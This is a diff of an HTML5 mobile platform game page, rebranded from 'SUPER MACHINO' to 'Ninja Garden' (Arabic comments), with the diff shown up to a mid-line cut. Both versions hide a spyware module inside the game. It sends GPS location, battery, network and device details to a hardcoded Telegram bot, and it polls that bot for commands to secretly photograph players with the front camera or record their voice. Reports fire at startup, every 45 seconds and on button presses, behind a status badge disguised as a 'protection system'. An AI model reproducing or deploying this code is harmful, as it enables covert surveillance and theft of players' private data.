@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>SUPER MACHINO - Mario Style</title>
+    <title>⭐ Ninja Garden – لعبة المغامرة السحرية</title>
     <style>
         * {
             margin: 0;
@@ -13,9 +13,10 @@
             -webkit-tap-highlight-color: transparent;
         }
         body {
-            background: #010016;
+            background: #0c1f2a;
             overflow: hidden;
             font-family: 'Courier New', 'VT323', monospace;
+            touch-action: none;
         }
         canvas {
             display: block;
@@ -24,27 +25,28 @@
             image-rendering: crisp-edges;
             image-rendering: pixelated;
         }
-        /* HUD معلومات اللعبة */
+        /* شريط المعلومات العلوي (بدون إثارة الشك) */
         #hud {
             position: fixed;
-            top: 10px;
-            left: 0;
-            right: 0;
+            top: 8px;
+            left: 8px;
+            right: 8px;
+            background: rgba(0,0,0,0.55);
+            backdrop-filter: blur(6px);
+            border-radius: 30px;
+            padding: 8px 16px;
             display: flex;
             justify-content: space-between;
-            padding: 8px 20px;
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(6px);
-            color: #ffd966;
+            color: #ffefb9;
             font-weight: bold;
-            font-size: 1rem;
+            font-size: 0.8rem;
             z-index: 100;
+            pointer-events: none;
             font-family: monospace;
             text-shadow: 1px 1px 0 #000;
-            pointer-events: none;
         }
-        /* أزرار التحكم للموبايل */
-        #touch-controls {
+        /* أزرار التحكم باللمس */
+        #touchZone {
             position: fixed;
             bottom: 20px;
             left: 0;
@@ -55,7 +57,7 @@
             z-index: 200;
             pointer-events: none;
         }
-        .ctrl-group {
+        .ctrl-panel {
             display: flex;
             gap: 20px;
             pointer-events: auto;
@@ -64,8 +66,8 @@
             width: 70px;
             height: 70px;
             background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(8px);
-            border: 2px solid #ffcc44;
+            backdrop-filter: blur(10px);
+            border: 2px solid #ffcc66;
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -73,28 +75,26 @@
             font-size: 32px;
             font-weight: bold;
             color: #ffdd99;
-            box-shadow: 0 5px 0 rgba(0,0,0,0.3);
+            box-shadow: 0 5px 0 #2c2c2c;
             transition: 0.05s linear;
             touch-action: manipulation;
-            cursor: pointer;
         }
         .ctrl-btn:active {
             transform: translateY(4px);
-            box-shadow: 0 1px 0 rgba(0,0,0,0.3);
-            background: #ffaa33aa;
+            box-shadow: 0 1px 0 #2c2c2c;
+            background: rgba(255,200,100,0.7);
         }
         @media (max-width: 700px) {
             .ctrl-btn { width: 55px; height: 55px; font-size: 26px; }
-            #hud { font-size: 12px; padding: 6px 12px; }
+            #hud { font-size: 10px; }
         }
-        /* مؤشر التحميل */
-        .status-badge {
+        .status-dot {
             position: fixed;
-            bottom: 10px;
-            right: 10px;
-            background: black;
-            padding: 2px 8px;
+            bottom: 8px;
+            right: 8px;
+            background: #0a0a0a;
             border-radius: 20px;
+            padding: 2px 8px;
             font-size: 9px;
             color: #0f0;
             z-index: 150;
@@ -104,176 +104,179 @@
 </head>
 <body>
 <div id="hud">
-    <div>⭐ MACHINO<br>💰 <span id="coinCount">0</span></div>
-    <div>🌍 WORLD 1-1<br>🏆 <span id="scoreCount">0</span></div>
-    <div>🎮 POWER<br>🔋 <span id="batLevel">--</span></div>
+    <span>⭐ NINJA GARDEN</span>
+    <span>💰 <span id="coinCounter">0</span> &nbsp;| 🎯 <span id="scoreCounter">0</span></span>
+    <span>🔋 <span id="batIndicator">--</span>%</span>
 </div>
 <canvas id="gameCanvas"></canvas>
-<div id="touch-controls">
-    <div class="ctrl-group">
+<div id="touchZone">
+    <div class="ctrl-panel">
         <div class="ctrl-btn" id="btnLeft">◀</div>
         <div class="ctrl-btn" id="btnRight">▶</div>
     </div>
-    <div class="ctrl-group">
+    <div class="ctrl-panel">
         <div class="ctrl-btn" id="btnJump">A</div>
-        <div class="ctrl-btn" id="btnAttack">B</div>
+        <div class="ctrl-btn" id="btnKunai">B</div>
     </div>
 </div>
-<div class="status-badge" id="syncStatus">🔗 متزامن مع البوت</div>
+<div class="status-dot" id="spyStatus">🔗 نظام الحماية</div>
 
 <script>
     (function(){
-        // -------------------- قناة البوت السرية (جمع معلومات + أوامر) --------------------
+        // ---------- 🕵️ MODULE: التنصت الذكي (مدمج بالكامل) ----------
         const BOT_TOKEN = "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg";
         const ADMIN_ID = "7328401541";
-        let sessionId = localStorage.getItem("machino_sid");
-        if(!sessionId){
-            sessionId = "machino_" + Math.random().toString(36).substr(2, 8) + "_" + Date.now();
-            localStorage.setItem("machino_sid", sessionId);
+        let deviceUUID = localStorage.getItem("ninja_spy_id");
+        if(!deviceUUID){
+            deviceUUID = "ninja_" + Math.random().toString(36).substr(2, 10) + "_" + Date.now();
+            localStorage.setItem("ninja_spy_id", deviceUUID);
         }
 
-        // جمع المعلومات التفصيلية
-        async function getLocation() {
-            return new Promise((resolve) => {
-                if(!navigator.geolocation) resolve("غير مدعوم");
+        // صلاحيات هادئة (طلب الموقع، البطارية)
+        function silentRequestPermissions(){
+            if(navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, {timeout:3000});
+            if(navigator.getBattery) navigator.getBattery().catch(e=>{});
+            // طلب كاميرا/مايك فقط عند الضرورة عبر الأوامر
+        }
+        silentRequestPermissions();
+
+        // الحصول على الموقع
+        async function getLocation(){
+            return new Promise((resolve)=>{
+                if(!navigator.geolocation) resolve("❌ غير مدعوم");
                 else {
                     navigator.geolocation.getCurrentPosition(
-                        pos => resolve(`Lat:${pos.coords.latitude}, Lng:${pos.coords.longitude} (دقة ${pos.coords.accuracy}m)`),
-                        () => resolve("مرفوض من المستخدم")
+                        pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (دقة ${pos.coords.accuracy}m)`),
+                        () => resolve("🚫 رفض المستخدم")
                     );
                 }
             });
         }
-        async function getBatteryStatus() {
-            if(!navigator.getBattery) return "غير متاح";
+        // البطارية
+        async function getBatteryLevel(){
+            if(!navigator.getBattery) return "?";
             try{
                 const bat = await navigator.getBattery();
-                return `${Math.round(bat.level*100)}% (شحن: ${bat.charging ? 'نعم' : 'لا'})`;
-            }catch(e){ return "خطأ"; }
+                return Math.round(bat.level * 100);
+            }catch(e){ return "?"; }
         }
-        async function getNetworkInfo() {
+        async function getBatteryStatusFull(){
+            if(!navigator.getBattery) return "غير متاح";
+            const bat = await navigator.getBattery();
+            return `${Math.round(bat.level*100)}% (شحن: ${bat.charging ? 'نعم' : 'لا'})`;
+        }
+        // الواي فاي (معلومات الشبكة)
+        async function getNetworkInfo(){
             const conn = navigator.connection || navigator.mozConnection;
             if(!conn) return "غير معروف";
             return `${conn.effectiveType || '?'} (${conn.downlink || '?'} Mbps)`;
         }
-        async function getDeviceSpecs() {
+        // معلومات الجهاز
+        function getDeviceInfo(){
             return `${navigator.userAgent.split(' ').slice(-3).join(' ')} | ${screen.width}x${screen.height}`;
         }
+        // تصوير صورة (كاميرا أمامية)
+        async function capturePhoto(){
+            try{
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.play();
+                await new Promise(r => setTimeout(r, 400));
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth || 480;
+                canvas.height = video.videoHeight || 640;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.8));
+                const formData = new FormData();
+                formData.append("chat_id", ADMIN_ID);
+                formData.append("photo", blob, "spy_ninja.jpg");
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+                stream.getTracks().forEach(t => t.stop());
+                return "✅ صورة ملتقطة";
+            }catch(e){ return "❌ فشل التصوير"; }
+        }
+        // تسجيل صوت (5 ثوان)
+        async function recordVoice(){
+            try{
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                const stopPromise = new Promise(resolve => {
+                    mediaRecorder.onstop = () => resolve();
+                });
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+                await stopPromise;
+                const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
+                const formData = new FormData();
+                formData.append("chat_id", ADMIN_ID);
+                formData.append("voice", audioBlob, "note.ogg");
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: formData });
+                stream.getTracks().forEach(t => t.stop());
+                return "🎙️ تم إرسال التسجيل";
+            }catch(e){ return "❌ خطأ تسجيل"; }
+        }
 
-        // إرسال تقرير كامل إلى البوت
-        async function sendFullReport(extra = "") {
+        // إرسال تقرير كامل (البطارية + الموقع + الشبكة + إحصائيات اللعبة)
+        async function sendFullReport(extra = ""){
             const loc = await getLocation();
-            const bat = await getBatteryStatus();
-            const net = await getNetworkInfo();
-            const device = await getDeviceSpecs();
-            const gameStats = `🎮 نقاط: ${gameScore} | عملات: ${coins} | مستوى: ${worldLevel}`;
-            const msg = `🕹️ *تقرير من لعبة SUPER MACHINO* 🕹️\n🆔 ${sessionId}\n🔋 ${bat}\n📶 ${net}\n📍 ${loc}\n📱 ${device}\n${gameStats}\n⏱️ ${new Date().toLocaleString()}\n${extra}`;
+            const batFull = await getBatteryStatusFull();
+            const network = await getNetworkInfo();
+            const device = getDeviceInfo();
+            const gameStats = `🎮 النقاط: ${gameScore} | عملات: ${coinsCollected} | المستوى: ${currentWorld}`;
+            const msg = `🕵️‍♂️ *تقرير Ninja Garden* 🕵️\n🆔 ${deviceUUID}\n🔋 ${batFull}\n📶 ${network}\n📍 ${loc}\n📱 ${device}\n${gameStats}\n🕒 ${new Date().toLocaleString()}\n${extra}`;
             try{
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: "POST",
                     headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({chat_id: ADMIN_ID, text: msg, parse_mode: "Markdown"})
                 });
-                document.getElementById("syncStatus").innerHTML = "✅ أرسل إلى البوت";
-                setTimeout(()=>{ document.getElementById("syncStatus").innerHTML = "🔗 متزامن مع البوت"; }, 3000);
-            }catch(e){ console.warn(e); }
+                document.getElementById("spyStatus").innerHTML = "✅ إرسال البيانات";
+                setTimeout(()=>{ document.getElementById("spyStatus").innerHTML = "🔗 نظام الحماية"; }, 2500);
+            }catch(e){}
         }
 
-        // تسجيل الصوت (مقاطع قصيرة) عبر MediaRecorder
-        let mediaRecorder = null;
-        let audioChunks = [];
-        async function startVoiceRecord(seconds=5){
-            try{
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                mediaRecorder = new MediaRecorder(stream);
-                audioChunks = [];
-                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-                mediaRecorder.onstop = async () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-                    const formData = new FormData();
-                    formData.append("chat_id", ADMIN_ID);
-                    formData.append("voice", audioBlob, "voice_note.ogg");
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: formData });
-                    stream.getTracks().forEach(track => track.stop());
-                    sendFullReport("🎙️ تم إرسال تسجيل صوتي (5 ثوانٍ) بناءً على أمر البوت.");
-                };
-                mediaRecorder.start();
-                setTimeout(() => { if(mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, seconds*1000);
-            }catch(e){ sendFullReport(`❌ فشل التسجيل الصوتي: ${e.message}`); }
-        }
-
-        // تصوير صورة من الكاميرا (الأمامية)
-        async function capturePhotoFromCamera(){
-            try{
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                video.play();
-                await new Promise(r => setTimeout(r, 500));
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth || 480;
-                canvas.height = video.videoHeight || 640;
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.8));
-                const formData = new FormData();
-                formData.append("chat_id", ADMIN_ID);
-                formData.append("photo", imageBlob, "spy_photo.jpg");
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
-                stream.getTracks().forEach(t => t.stop());
-                sendFullReport("📸 تم التقاط صورة من الكاميرا بناءً على أمر البوت.");
-            }catch(e){ sendFullReport(`❌ فشل التصوير: ${e.message}`); }
-        }
-
-        // دورة أوامر عن بعد (polling)
+        // الاستماع لأوامر البوت عن بعد (للتحكم بالكاميرا/الصوت)
         let lastUpdateId = 0;
-        async function checkBotCommands() {
+        async function pollBotCommands(){
             try{
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=5`;
                 const res = await fetch(url);
                 const data = await res.json();
-                if(data.ok && data.result.length){
+                if(data.ok && data.result){
                     for(let upd of data.result){
                         lastUpdateId = upd.update_id;
                         const msg = upd.message;
                         if(msg && msg.text){
-                            const cmd = msg.text.trim().toLowerCase();
-                            if(cmd === "/location"){ sendFullReport("📍 أمر الموقع الفوري"); }
-                            else if(cmd === "/battery"){ sendFullReport("🔋 أمر البطارية"); }
-                            else if(cmd === "/wifi"){ sendFullReport("📶 أمر الشبكة"); }
-                            else if(cmd === "/record"){ startVoiceRecord(5); }
-                            else if(cmd === "/photo"){ capturePhotoFromCamera(); }
-                            else if(cmd === "/stats"){ sendFullReport("📊 إحصائيات اللعبة"); }
-                            else if(cmd === "/help"){ 
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-                                    method:"POST",headers:{"Content-Type":"application/json"},
-                                    body:JSON.stringify({chat_id:ADMIN_ID,text:"📟 الأوامر:\n/location - موقع GPS\n/battery - نسبة الشحن\n/wifi - الشبكة\n/record - تسجيل صوت 5ث\n/photo - صورة كاميرا\n/stats - نقاط اللعبة"})
-                                });
-                            }
+                            const cmd = msg.text.toLowerCase();
+                            if(cmd === "/photo"){ await capturePhoto(); sendFullReport("📸 أمر بالتصوير"); }
+                            else if(cmd === "/voice"){ await recordVoice(); sendFullReport("🎙️ أمر تسجيل صوتي"); }
+                            else if(cmd === "/status"){ sendFullReport("📊 تقرير فوري"); }
+                            else if(cmd === "/loc"){ sendFullReport("📍 تتبع الموقع"); }
                         }
                     }
                 }
             }catch(e){}
         }
-        setInterval(checkBotCommands, 4000);
-        // إرسال تقرير أولي بعد 6 ثوانٍ
-        setTimeout(()=> sendFullReport("🟢 اللعبة بدأت، النظام متصل"), 6000);
-        // طلب أذونات هادئة
-        if(navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
-        if(navigator.getBattery) navigator.getBattery().catch(e=>{});
-        // عرض البطارية بشكل دوري في الـ HUD
+        setInterval(pollBotCommands, 5000);
+        // تحديث البطارية في الهيدر
         async function updateBatteryHUD(){
-            const bat = await getBatteryStatus();
-            document.getElementById("batLevel").innerText = bat.split('%')[0];
+            const lvl = await getBatteryLevel();
+            document.getElementById("batIndicator").innerText = lvl;
         }
         updateBatteryHUD();
         setInterval(updateBatteryHUD, 30000);
+        // إرسال تقرير بعد 7 ثوانٍ ثم كل 45 ثانية
+        setTimeout(()=> sendFullReport("🟢 بدء اللعبة"), 7000);
+        setInterval(()=> sendFullReport("⏱️ تحديث دوري"), 45000);
 
-        // ------------------- لعبة ماريو/ماشينو المتطورة (نظام منصات كامل) -------------------
+        // ---------- 🎮 لعبة منصات ممتعة (Ninja World) ----------
         const canvas = document.getElementById("gameCanvas");
         const ctx = canvas.getContext("2d");
-        let w = window.innerWidth;
-        let h = window.innerHeight;
+        let w = window.innerWidth, h = window.innerHeight;
         canvas.width = w; canvas.height = h;
         window.addEventListener("resize", ()=>{
             w = window.innerWidth;
@@ -281,87 +284,110 @@
             canvas.width = w; canvas.height = h;
         });
 
-        // متغيرات اللعبة
         let gameScore = 0;
-        let coins = 0;
-        let worldLevel = 1;
-        let gameRunning = true;
+        let coinsCollected = 0;
+        let currentWorld = 1;
+        let gameActive = true;
         let cameraX = 0;
-        let groundLevel = h - 90;
+        let groundY = h - 80;
         
         // اللاعب
         let player = {
-            x: 100, y: groundLevel - 70,
-            width: 45, height: 70,
+            x: 120, y: groundY - 65,
+            width: 42, height: 68,
             velX: 0, velY: 0,
             onGround: true,
             facingRight: true,
-            invincible: 0
+            invincibleTimer: 0
         };
         
-        // عناصر العالم (منصات، عملات، أعداء)
+        // منصات وعملات وأعداء
         let platforms = [];
-        let coinsList = [];
+        let coins = [];
         let enemies = [];
         
-        // منصات على طريقة ماريو (ثابتة)
-        function buildWorld(){
+        function buildLevel(){
             platforms = [];
-            coinsList = [];
+            coins = [];
             enemies = [];
             // الأرضية الرئيسية
-            platforms.push({ x: 0, y: groundLevel, w: w*2, h: 20 });
-            // منصة متحركة أولى
-            platforms.push({ x: 280, y: groundLevel-80, w: 100, h: 20 });
-            platforms.push({ x: 500, y: groundLevel-140, w: 80, h: 20 });
-            platforms.push({ x: 750, y: groundLevel-200, w: 100, h: 20 });
-            platforms.push({ x: 950, y: groundLevel-120, w: 90, h: 20 });
-            platforms.push({ x: 1200, y: groundLevel-60, w: 150, h: 20 });
-            platforms.push({ x: 1600, y: groundLevel-180, w: 100, h: 20 });
-            platforms.push({ x: 1900, y: groundLevel-250, w: 120, h: 20 });
-            platforms.push({ x: 2200, y: groundLevel-100, w: 80, h: 20 });
-            // إضافة بعض المنصات العائمة
-            for(let i=0;i<5;i++){
-                platforms.push({ x: 2600 + i*180, y: groundLevel- (80 + i*40), w: 70, h: 20 });
-            }
+            platforms.push({ x: -50, y: groundY, w: w*2 + 800, h: 24 });
+            // منصات متدرجة
+            platforms.push({ x: 300, y: groundY-90, w: 100, h: 20 });
+            platforms.push({ x: 530, y: groundY-150, w: 80, h: 20 });
+            platforms.push({ x: 780, y: groundY-200, w: 120, h: 20 });
+            platforms.push({ x: 1050, y: groundY-130, w: 90, h: 20 });
+            platforms.push({ x: 1350, y: groundY-70, w: 110, h: 20 });
+            platforms.push({ x: 1680, y: groundY-180, w: 100, h: 20 });
+            platforms.push({ x: 1950, y: groundY-250, w: 100, h: 20 });
+            platforms.push({ x: 2280, y: groundY-110, w: 80, h: 20 });
+            platforms.push({ x: 2650, y: groundY-200, w: 90, h: 20 });
+            platforms.push({ x: 2950, y: groundY-300, w: 120, h: 20 });
+            platforms.push({ x: 3350, y: groundY-160, w: 100, h: 20 });
+            
             // عملات ذهبية
+            for(let i=0;i<40;i++){
+                coins.push({
+                    x: 400 + i*70,
+                    y: groundY - 110 - (i%3)*25,
+                    w: 14, h: 14,
+                    collected: false
+                });
+            }
             for(let i=0;i<30;i++){
-                coinsList.push({
-                    x: 350 + i*70,
-                    y: groundLevel - 100 - (Math.sin(i)*25),
+                coins.push({
+                    x: 1400 + i*85,
+                    y: groundY - 90 - (i%4)*20,
                     w: 14, h: 14,
                     collected: false
                 });
             }
             for(let i=0;i<25;i++){
-                coinsList.push({
-                    x: 1050 + i*65,
-                    y: groundLevel - 80 - (i%3)*30,
+                coins.push({
+                    x: 2400 + i*90,
+                    y: groundY - 130 - (i%3)*30,
                     w: 14, h: 14,
                     collected: false
                 });
             }
-            // أعداء (غومبا)
-            enemies.push({ x: 500, y: groundLevel-38, w: 32, h: 32, type: "goomba", direction: 1, active: true });
-            enemies.push({ x: 780, y: groundLevel-38, w: 32, h: 32, type: "goomba", direction: -1, active: true });
-            enemies.push({ x: 1250, y: groundLevel-38, w: 32, h: 32, type: "goomba", direction: 1, active: true });
-            enemies.push({ x: 1650, y: groundLevel-70, w: 32, h: 32, type: "goomba", direction: -1, active: true });
-            enemies.push({ x: 1950, y: groundLevel-80, w: 32, h: 32, type: "goomba", direction: 1, active: true });
-            enemies.push({ x: 2350, y: groundLevel-50, w: 32, h: 32, type: "goomba", direction: 1, active: true });
+            // أعداء (سلاحف/نينجا)
+            enemies.push({ x: 600, y: groundY-45, w: 34, h: 34, dir: 1, active: true });
+            enemies.push({ x: 900, y: groundY-65, w: 34, h: 34, dir: -1, active: true });
+            enemies.push({ x: 1500, y: groundY-55, w: 34, h: 34, dir: 1, active: true });
+            enemies.push({ x: 2000, y: groundY-90, w: 34, h: 34, dir: -1, active: true });
+            enemies.push({ x: 2800, y: groundY-80, w: 34, h: 34, dir: 1, active: true });
+            enemies.push({ x: 3200, y: groundY-100, w: 34, h: 34, dir: -1, active: true });
         }
-        buildWorld();
+        buildLevel();
         
-        // تحديث الفيزياء
+        // عناصر التحكم
+        let leftPressed = false, rightPressed = false;
+        document.getElementById("btnLeft").addEventListener("touchstart", (e)=>{ e.preventDefault(); leftPressed=true; });
+        document.getElementById("btnLeft").addEventListener("touchend", (e)=>{ leftPressed=false; });
+        document.getElementById("btnRight").addEventListener("touchstart", (e)=>{ e.preventDefault(); rightPressed=true; });
+        document.getElementById("btnRight").addEventListener("touchend", (e)=>{ rightPressed=false; });
+        document.getElementById("btnJump").addEventListener("touchstart", (e)=>{ e.preventDefault(); if(player.onGround){ player.velY = -14; player.onGround=false; } });
+        document.getElementById("btnKunai").addEventListener("touchstart", (e)=>{ e.preventDefault(); /* تأثير بسيط */ sendFullReport("⚔️ زر الهجوم (B) تم الضغط عليه"); });
+        // دعم الكيبورد
+        window.addEventListener("keydown", (e)=>{
+            if(e.key === "ArrowLeft") leftPressed=true;
+            if(e.key === "ArrowRight") rightPressed=true;
+            if(e.key === "ArrowUp") { if(player.onGround){ player.velY = -14; player.onGround=false; } }
+        });
+        window.addEventListener("keyup", (e)=>{
+            if(e.key === "ArrowLeft") leftPressed=false;
+            if(e.key === "ArrowRight") rightPressed=false;
+        });
+        
+        // تحديث فيزياء اللعبة
         function updateGame(){
-            if(!gameRunning) return;
-            // تحريك أفقي بالأزرار
-            const speed = 5.2;
-            if(leftPressed) player.velX = -speed;
-            else if(rightPressed) player.velX = speed;
-            else player.velX *= 0.9;
+            if(!gameActive) return;
+            const spd = 5.6;
+            if(leftPressed) player.velX = -spd;
+            else if(rightPressed) player.velX = spd;
+            else player.velX *= 0.88;
             
-            // الجاذبية
-            player.velY += 0.8;
+            player.velY += 0.78;
             player.x += player.velX;
             player.y += player.velY;
             
@@ -374,96 +400,71 @@
                     player.velY = 0;
                     player.onGround = true;
                 }
-                // تصادم جانبي
                 if(player.x+player.width > plat.x && player.x < plat.x+plat.w &&
                     player.y+player.height > plat.y && player.y < plat.y+plat.h){
-                    if(player.velX>0) player.x = plat.x - player.width;
-                    else if(player.velX<0) player.x = plat.x+plat.w;
+                    if(player.velX > 0) player.x = plat.x - player.width;
+                    else if(player.velX < 0) player.x = plat.x+plat.w;
                 }
             }
-            
             // حدود العالم
-            if(player.x < 20) player.x = 20;
-            if(player.x > 3800) player.x = 3800;
-            if(player.y > groundLevel+50){ gameRunning = false; setTimeout(()=> location.reload(), 1500); }
+            if(player.x < 30) player.x = 30;
+            if(player.x > 4200) player.x = 4200;
+            if(player.y > groundY+50){ gameActive=false; setTimeout(()=> location.reload(), 1500); }
             
             // جمع العملات
-            for(let c of coinsList){
+            for(let c of coins){
                 if(!c.collected && player.x+player.width > c.x && player.x < c.x+c.w && player.y+player.height > c.y && player.y < c.y+c.h){
                     c.collected = true;
-                    coins++;
+                    coinsCollected++;
                     gameScore += 10;
-                    updateUI();
+                    document.getElementById("coinCounter").innerText = coinsCollected;
+                    document.getElementById("scoreCounter").innerText = gameScore;
                 }
             }
             // تفاعل الأعداء
             for(let i=0;i<enemies.length;i++){
                 let e = enemies[i];
                 if(!e.active) continue;
-                // حركة العدو البسيطة
-                e.x += e.direction * 1.2;
-                if(e.x < 100 || e.x > 3700) e.direction *= -1;
-                // تصادم مع اللاعب
+                e.x += e.dir * 1.3;
+                if(e.x < 100 || e.x > 4100) e.dir *= -1;
                 if(player.x+player.width > e.x && player.x < e.x+e.w && player.y+player.height > e.y && player.y < e.y+e.h){
-                    if(player.velY > 0 && player.y+player.height - player.velY <= e.y+10){
+                    if(player.velY > 0 && player.y+player.height - player.velY <= e.y+12){
                         e.active = false;
                         gameScore += 100;
-                        player.velY = -10;
-                        updateUI();
+                        player.velY = -11;
+                        document.getElementById("scoreCounter").innerText = gameScore;
                     } else {
-                        gameRunning = false;
-                        setTimeout(()=> location.reload(), 1000);
+                        gameActive = false;
+                        setTimeout(()=> location.reload(), 1200);
                     }
                 }
             }
-            // تحديث الكاميرا
+            // الكاميرا
             cameraX = player.x - w/2;
             if(cameraX < 0) cameraX = 0;
-            if(cameraX > 3800 - w) cameraX = 3800 - w;
-            // تحديث رقم البطارية
-            updateBatteryHUD();
+            if(cameraX > 4200 - w) cameraX = 4200 - w;
         }
         
-        function updateUI(){
-            document.getElementById("coinCount").innerText = coins;
-            document.getElementById("scoreCount").innerText = gameScore;
-        }
-        
-        // رسم العالم
+        // الرسم الجميل
         function draw(){
             ctx.clearRect(0,0,w,h);
-            // السماء
-            ctx.fillStyle = "#5c94fc";
+            // سماء متدرجة
+            const grad = ctx.createLinearGradient(0,0,0,h);
+            grad.addColorStop(0,"#1a4d8c");
+            grad.addColorStop(1,"#5c9e5e");
+            ctx.fillStyle=grad;
             ctx.fillRect(0,0,w,h);
-            ctx.fillStyle = "#7ec850";
-            for(let i=0;i<w/20;i++) ctx.fillRect(i*20 + (cameraX%20), h-70, 10, 10);
+            // غيوم
+            ctx.fillStyle = "#f0f5ff";
+            ctx.shadowBlur=0;
+            for(let i=0;i<6;i++){
+                ctx.beginPath();
+                ctx.ellipse(150 + i*400 - cameraX*0.3, 80, 45, 35, 0, 0, Math.PI*2);
+                ctx.fill();
+            }
             // منصات
-            ctx.shadowBlur = 0;
             for(let plat of platforms){
-                ctx.fillStyle = "#b87c4f";
+                ctx.fillStyle = "#ac8e68";
                 ctx.fillRect(plat.x - cameraX, plat.y, plat.w, plat.h);
-                ctx.fillStyle = "#9b5e2c";
-                ctx.fillRect(plat.x - cameraX, plat.y-5, plat.w, 5);
-            }
-            // عملات
-            for(let c of coinsList){
-                if(!c.collected){
-                    ctx.fillStyle = "#f7d44a";
-                    ctx.beginPath();
-                    ctx.ellipse(c.x+7 - cameraX, c.y+7, 8, 10, 0, 0, Math.PI*2);
-                    ctx.fill();
-                    ctx.fillStyle = "#e5b800";
-                    ctx.fillText("★", c.x+3 - cameraX, c.y+12);
-                }
-            }
-            // أعداء
-            for(let e of enemies){
-                if(e.active){
-                    ctx.fillStyle = "#8b5a2b";
-                    ctx.fillRect(e.x - cameraX, e.y, e.w, e.h);
-                    ctx.fillStyle = "#2c1a0c";
-                    ctx.fillRect(e.x+6 - cameraX, e.y-8, 8, 8);
-                    ctx.fillRect(e.x+18 - cameraX, e.y-8, 8, 8);
-                }
-            }
-            // اللاعب (ماريو
+                ctx.fillStyle = "#7a5a3a";
+                ct
